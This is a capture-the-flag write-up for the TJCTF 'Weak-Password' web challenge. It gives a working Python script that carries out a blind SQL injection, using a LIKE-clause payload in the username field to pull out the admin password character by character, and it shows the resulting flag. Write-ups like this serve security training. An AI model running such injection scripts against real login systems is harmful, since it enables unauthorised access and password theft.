# Weak-Password
Web, 50

>  Written by saisree
>  It seems your login bypass skills are now famous! One of my friends has given you a challenge: figure out his password on this site. He's told me that his username is admin, and that his password is made of up only lowercase letters and numbers. (Wrap the password with tjctf{...}) 

The log in page given is vulnerable to SQL injection, but logging in does not get the flag. We likely have to get the admin's password. To do this, we construct an SQL `LIKE` statement to test each character of the password string. For example, `password LIKE "a%"` tells us whether or not the password begins with `a`. Testing every letter for each sequential password character gives us the flag.

Script:

```python
import requests
import string

charset = string.ascii_lowercase + string.digits

url = "https://weak_password.tjctf.org/login"

password = ""
prev = None

while True:

    if prev == password:
        break
    
    prev = str(password)
    
    for i in charset:
        data = {
            "username":"admin' AND password LIKE '{}%';-- ".format(password+i),
            "password":""
        }

        p = requests.post(url, data)

        if "logged" in p.text.lower():
            password += i
            print(password)
            break
```

Flag: `tjctf{blindsqli14519}`